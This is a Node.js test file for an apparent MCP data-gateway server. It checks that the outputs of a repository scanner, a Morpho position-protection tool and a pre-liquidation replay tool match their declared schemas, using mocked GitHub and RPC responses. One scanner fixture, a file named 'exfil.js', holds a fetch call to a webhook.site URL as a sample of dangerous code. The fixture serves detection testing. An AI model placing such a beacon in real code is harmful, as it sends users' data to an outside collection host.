import assert from "node:assert/strict";
import test from "node:test";

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";

import { asToolResult } from "./mcp-server.mjs";
import { morphoProtection, morphoProtectionMcpOutputSchema } from "./morpho-protection.mjs";
import { morphoPreLiquidationReplay, morphoPreLiquidationReplayMcpOutputSchema } from "./morpho-preliquidation-replay.mjs";
import { scanRepo, scanRepoMcpOutputSchema } from "./scan.mjs";
import { encodeAbiParameters, encodeEventTopics, encodeFunctionData, encodeFunctionResult, keccak256 } from "viem";

function schemaType(schema) {
  return schema?._def?.typeName;
}

function isOptional(schema) {
  return schemaType(schema) === "ZodOptional" || schemaType(schema) === "ZodDefault";
}

function requiredPathsFromSchema(schema, prefix = "") {
  const type = schemaType(schema);
  if (type === "ZodOptional" || type === "ZodDefault") {
    return [];
  }
  if (type === "ZodNullable" || type === "ZodEffects") {
    return requiredPathsFromSchema(type === "ZodEffects" ? schema._def.schema : schema._def.innerType, prefix);
  }
  if (type === "ZodObject") {
    const paths = [];
    for (const [key, child] of Object.entries(schema.shape)) {
      const path = prefix ? `${prefix}.${key}` : key;
      if (isOptional(child)) continue;
      paths.push(path);
      paths.push(...requiredPathsFromSchema(child, path));
    }
    return paths;
  }
  if (type === "ZodUnion" || type === "ZodDiscriminatedUnion") {
    const sets = (schema._def.options || []).map((option) => new Set(requiredPathsFromSchema(option, prefix)));
    if (!sets.length) return [];
    return [...sets[0]].filter((path) => sets.every((set) => set.has(path)));
  }
  return [];
}

function assertRequiredPaths(schema, value, path = "$") {
  const type = schemaType(schema);
  if (type === "ZodOptional") {
    if (value === undefined) return;
    return assertRequiredPaths(schema._def.innerType, value, path);
  }
  if (type === "ZodNullable") {
    if (value === null) return;
    return assertRequiredPaths(schema._def.innerType, value, path);
  }
  if (type === "ZodDefault") return assertRequiredPaths(schema._def.innerType, value, path);
  if (type === "ZodEffects") return assertRequiredPaths(schema._def.schema, value, path);
  if (type === "ZodObject") {
    assert.equal(Boolean(value) && typeof value === "object" && !Array.isArray(value), true, `${path} must be an object`);
    for (const [key, child] of Object.entries(schema.shape)) {
      const childPath = `${path}.${key}`;
      if (isOptional(child)) {
        if (Object.hasOwn(value, key) && value[key] !== undefined) assertRequiredPaths(child, value[key], childPath);
        continue;
      }
      assert.equal(Object.hasOwn(value, key), true, `missing required path ${childPath}`);
      assertRequiredPaths(child, value[key], childPath);
    }
    return;
  }
  if (type === "ZodArray") {
    assert.equal(Array.isArray(value), true, `${path} must be an array`);
    for (const [index, item] of value.entries()) {
      assertRequiredPaths(schema._def.type, item, `${path}[${index}]`);
    }
    return;
  }
  if (type === "ZodUnion" || type === "ZodDiscriminatedUnion") {
    const match = (schema._def.options || []).find((option) => option.safeParse(value).success);
    assert.ok(match, `${path} did not match a declared union option`);
    return assertRequiredPaths(match, value, path);
  }
}

function assertSchemaMatchesHandler(schema, value) {
  const parsed = schema.safeParse(value);
  assert.equal(parsed.success, true, parsed.success ? "" : parsed.error);
  assertRequiredPaths(schema, value);
  for (const path of requiredPathsFromSchema(schema)) {
    const parts = path.split(".");
    let current = value;
    for (const part of parts) {
      assert.equal(Boolean(current) && typeof current === "object" && !Array.isArray(current) && Object.hasOwn(current, part), true, `missing required path ${path}`);
      current = current[part];
    }
  }
  assert.equal(schema.safeParse({ ...value, extra: true }).success, false);
  const [firstRequired] = requiredPathsFromSchema(schema);
  if (firstRequired && !firstRequired.includes(".")) {
    const { [firstRequired]: _removed, ...rest } = value;
    assert.equal(schema.safeParse(rest).success, false);
  }
}

function jsonResponse(body, status = 200) {
  return new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });
}

async function scanWithFiles(files) {
  const original = globalThis.fetch;
  globalThis.fetch = async (url) => {
    const target = String(url);
    if (target.includes("/git/trees/")) {
      return jsonResponse({
        tree: Object.keys(files).map((path) => ({ type: "blob", path, size: files[path].length })),
      });
    }
    if (new URL(target).pathname === "/repos/owner/name") return jsonResponse({ default_branch: "main" });
    if (target.startsWith("https://raw.githubusercontent.com/owner/name/main/")) {
      const path = decodeURIComponent(target.split("/main/")[1]);
      return new Response(files[path] ?? "", { status: path in files ? 200 : 404 });
    }
    throw new Error(`unexpected fetch ${target}`);
  };
  try {
    return await scanRepo("owner/name");
  } finally {
    globalThis.fetch = original;
  }
}

const PROTECTION_ADDRESS = "0x4352Cc849b33a936Ad93bB109aFDec1c89653b4f";

function protectionSnapshot({ healthFactor = 1.6, verified = true } = {}) {
  const marketParams = {
    loanToken: `0x${"2".repeat(40)}`,
    collateralToken: `0x${"3".repeat(40)}`,
    oracle: `0x${"4".repeat(40)}`,
    irm: `0x${"5".repeat(40)}`,
    lltvRaw: "800000000000000000",
  };
  const marketId = keccak256(encodeAbiParameters(
    [{ type: "tuple", components: [
      { name: "loanToken", type: "address" },
      { name: "collateralToken", type: "address" },
      { name: "oracle", type: "address" },
      { name: "irm", type: "address" },
      { name: "lltv", type: "uint256" },
    ] }],
    [{ ...marketParams, lltv: BigInt(marketParams.lltvRaw) }],
  ));
  return {
    ok: true,
    address: PROTECTION_ADDRESS.toLowerCase(),
    chain: { id: 8453, name: "Base mainnet" },
    fetchedAt: "2026-08-09T03:00:00.000Z",
    latestIndexedAt: "2026-08-09T02:59:59.000Z",
    positions: [{
      marketId,
      marketParams,
      assets: {
        collateral: { address: `0x${"3".repeat(40)}`, symbol: "COL", decimals: 18, amountRaw: "1000000000000000000000" },
        loan: { address: `0x${"2".repeat(40)}`, symbol: "USDC", decimals: 6, borrowedRaw: "1000000000" },
      },
      oracle: { priceRaw: "2000000000000000000000000" },
      directRpc: {
        verified,
        corePositionVerified: verified,
        blockNumber: 123,
        collateralMatches: verified,
        borrowSharesMatches: verified,
        oraclePriceMatches: verified,
        oraclePriceRaw: "2000000000000000000000000",
      },
      risk: { healthFactor, liquidationLtvRaw: "800000000000000000" },
    }],
    source: { provider: "test", directRpc: { verdict: "exact_match" } },
  };
}

const REPLAY_TX = `0x${"a".repeat(64)}`;
const REPLAY_MARKET = `0x${"b".repeat(64)}`;
const REPLAY_CONTRACT = `0x${"1".repeat(40)}`;
const REPLAY_LIQUIDATOR = `0x${"2".repeat(40)}`;
const REPLAY_BORROWER = `0x${"3".repeat(40)}`;
const REPLAY_LOAN = `0x${"4".repeat(40)}`;
const REPLAY_COLLATERAL = `0x${"5".repeat(40)}`;
const REPLAY_ORACLE = `0x${"6".repeat(40)}`;
const REPLAY_IRM = `0x${"7".repeat(40)}`;
const REPLAY_EVENT_ABI = [{
  type: "event",
  name: "PreLiquidate",
  inputs: [
    { name: "id", type: "bytes32", indexed: true },
    { name: "liquidator", type: "address", indexed: true },
    { name: "borrower", type: "address", indexed: true },
    { name: "repaidAssets", type: "uint256", indexed: false },
    { name: "repaidShares", type: "uint256", indexed: false },
    { name: "seizedAssets", type: "uint256", indexed: false },
  ],
}];
const REPLAY_MARKET_ABI = [{
  type: "function",
  name: "marketParams",
  stateMutability: "view",
  inputs: [],
  outputs: [{ name: "", type: "tuple", components: [
    { name: "loanToken", type: "address" },
    { name: "collateralToken", type: "address" },
    { name: "oracle", type: "address" },
    { name: "irm", type: "address" },
    { name: "lltv", type: "uint256" },
  ] }],
}];
const REPLAY_PRE_ABI = [{
  type: "function",
  name: "preLiquidationParams",
  stateMutability: "view",
  inputs: [],
  outputs: [{ name: "", type: "tuple", components: [
    { name: "preLltv", type: "uint256" },
    { name: "preLCF1", type: "uint256" },
    { name: "preLCF2", type: "uint256" },
    { name: "preLIF1", type: "uint256" },
    { name: "preLIF2", type: "uint256" },
    { name: "preLiquidationOracle", type: "address" },
  ] }],
}];
const REPLAY_ORACLE_ABI = [{ type: "function", name: "price", stateMutability: "view", inputs: [], outputs: [{ name: "", type: "uint256" }] }];
const REPLAY_DECIMALS_ABI = [{ type: "function", name: "decimals", stateMutability: "view", inputs: [], outputs: [{ name: "", type: "uint8" }] }];
const REPLAY_SYMBOL_ABI = [{ type: "function", name: "symbol", stateMutability: "view", inputs: [], outputs: [{ name: "", type: "string" }] }];

function replayRpc() {
  const topics = encodeEventTopics({
    abi: REPLAY_EVENT_ABI,
    eventName: "PreLiquidate",
    args: { id: REPLAY_MARKET, liquidator: REPLAY_LIQUIDATOR, borrower: REPLAY_BORROWER },
  });
  const data = encodeAbiParameters(
    [{ type: "uint256" }, { type: "uint256" }, { type: "uint256" }],
    [4_800_000_000n, 4_700_000_000n, 5_000_000n],
  );
  return async (method, params) => {
    if (method === "eth_getTransactionReceipt") {
      return { status: "0x1", blockNumber: "0x64", gasUsed: "0x30d40", effectiveGasPrice: "0x3b9aca00", logs: [{ address: REPLAY_CONTRACT, topics, data }] };
    }
    if (method === "eth_getTransactionByHash") return { from: REPLAY_LIQUIDATOR, to: REPLAY_CONTRACT, gasPrice: "0x3b9aca00" };
    if (method === "eth_getBlockByNumber") return { timestamp: "0x64" };
    if (method !== "eth_call") throw new Error(`unexpected RPC method ${method}`);
    const { to, data: callData } = params[0];
    if (to.toLowerCase() === REPLAY_CONTRACT.toLowerCase() && callData === encodeFunctionData({ abi: REPLAY_MARKET_ABI, functionName: "marketParams" })) {
      return encodeFunctionResult({
        abi: REPLAY_MARKET_ABI,
        functionName: "marketParams",
        result: { loanToken: REPLAY_LOAN, collateralToken: REPLAY_COLLATERAL, oracle: REPLAY_ORACLE, irm: REPLAY_IRM, lltv: 860000000000000000n },
      });
    }
    if (to.toLowerCase() === REPLAY_CONTRACT.toLowerCase() && callData === encodeFunctionData({ abi: REPLAY_PRE_ABI, functionName: "preLiquidationParams" })) {
      return encodeFunctionResult({
        abi: REPLAY_PRE_ABI,
        functionName: "preLiquidationParams",
        result: {
          preLltv: 832603694978499652n,
          preLCF1: 2001493508968667n,
          preLCF2: 245311807032632372n,
          preLIF1: 1043841336116910229n,
          preLIF2: 1043841336116910229n,
          preLiquidationOracle: REPLAY_ORACLE,
        },
      });
    }
    if (to.toLowerCase() === REPLAY_ORACLE.toLowerCase()) {
      return encodeFunctionResult({ abi: REPLAY_ORACLE_ABI, functionName: "price", result: 1000n * 10n ** 36n });
    }
    if (callData === encodeFunctionData({ abi: REPLAY_DECIMALS_ABI, functionName: "decimals" })) {
      return encodeFunctionResult({ abi: REPLAY_DECIMALS_ABI, functionName: "decimals", result: to.toLowerCase() === REPLAY_LOAN.toLowerCase() ? 6 : 8 });
    }
    if (callData === encodeFunctionData({ abi: REPLAY_SYMBOL_ABI, functionName: "symbol" })) {
      return encodeFunctionResult({ abi: REPLAY_SYMBOL_ABI, functionName: "symbol", result: to.toLowerCase() === REPLAY_LOAN.toLowerCase() ? "USDC" : "cbBTC" });
    }
    throw new Error(`unexpected contract read ${to} ${callData}`);
  };
}

test("scan handler output covers every MCP schema-required path", async () => {
  const clean = await scanWithFiles({ "index.js": "console.log(1);\n" });
  assertSchemaMatchesHandler(scanRepoMcpOutputSchema, clean);
  const dangerous = await scanWithFiles({ "exfil.js": "fetch('https://webhook.site/abc');\n" });
  assertSchemaMatchesHandler(scanRepoMcpOutputSchema, dangerous);
  assert.ok(requiredPathsFromSchema(scanRepoMcpOutputSchema).includes("risk"));
  assert.ok(requiredPathsFromSchema(scanRepoMcpOutputSchema).includes("findings"));
});

test("morpho_protection handler output covers every MCP schema-required path", async () => {
  const available = await morphoProtection(PROTECTION_ADDRESS, {
    targetHealthFactor: "2",
    protectAgainstShockPct: -50,
    executionBufferBps: 0,
    positionLoader: async () => protectionSnapshot(),
  });
  assertSchemaMatchesHandler(morphoProtectionMcpOutputSchema, available);
  assert.equal(available.quotes[0].status, "protection_available");

  const targetMet = await morphoProtection(PROTECTION_ADDRESS, {
    targetHealthFactor: "1.25",
    protectAgainstShockPct: 0,
    executionBufferBps: 25,
    positionLoader: async () => protectionSnapshot(),
  });
  assertSchemaMatchesHandler(morphoProtectionMcpOutputSchema, targetMet);
  assert.equal(targetMet.quotes[0].status, "target_met");

  const unverified = await morphoProtection(PROTECTION_ADDRESS, {
    targetHealthFactor: "2",
    protectAgainstShockPct: -50,
    positionLoader: async () => protectionSnapshot({ verified: false }),
  });
  assertSchemaMatchesHandler(morphoProtectionMcpOutputSchema, unverified);
  assert.equal(unverified.quotes[0].status, "state_unverified");
});

test("morpho_preliquidation_replay handler output covers every MCP schema-required path", async () => {
  const result = await morphoPreLiquidationReplay(REPLAY_TX, { rpcRequest: replayRpc() });
  assertSchemaMatchesHandler(morphoPreLiquidationReplayMcpOutputSchema, result);
  assert.ok(requiredPathsFromSchema(morphoPreLiquidationReplayMcpOutputSchema).includes("events"));
  assert.ok(requiredPathsFromSchema(morphoPreLiquidationReplayMcpOutputSchema).includes("transaction.hash"));
});

test("MCP tools/list advertises the three Zod output schemas without a paid call", async () => {
  const server = new McpServer({ name: "x402-data-gateway", version: "test" });
  const tools = [
    { name: "scan", schema: scanRepoMcpOutputSchema, input: { repo: z.string() } },
    { name: "morpho_protection", schema: morphoProtectionMcpOutputSchema, input: { address: z.string() } },
    { name: "morpho_preliquidation_replay", schema: morphoPreLiquidationReplayMcpOutputSchema, input: { transactionHash: z.string() } },
  ];
  for (const tool of tools) {
    server.registerTool(tool.name, {
      description: tool.name,
      inputSchema: tool.input,
      outputSchema: tool.schema,
    }, async () => asToolResult({ ok: true }, { structured: true }));
  }

  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  const client = new Client({ name: "schema-test", version: "1.0.0" });
  await server.connect(serverTransport);
  await client.connect(clientTransport);
  const listed = await client.listTools();
  await client.close();
  await server.close();

  for (const tool of tools) {
    const advertised = listed.tools.find((entry) => entry.name === tool.name);
    assert.ok(advertised, `missing ${tool.name} in tools/list`);
    assert.equal(advertised.outputSchema?.type, "object");
    for (const path of requiredPathsFromSchema(tool.schema).filter((item) => !item.includes("."))) {
      assert.equal(advertised.outputSchema.required.includes(path), true, `${tool.name} tools/list omitted required ${path}`);
    }
    assert.equal(advertised.outputSchema.additionalProperties, false);
  }
});

test("structuredContent is attached only when an output schema exists", () => {
  const value = { ok: true, risk: "clean" };
  assert.equal("structuredContent" in asToolResult(value), false);
  assert.deepEqual(asToolResult(value, { structured: true }).structuredContent, value);
});
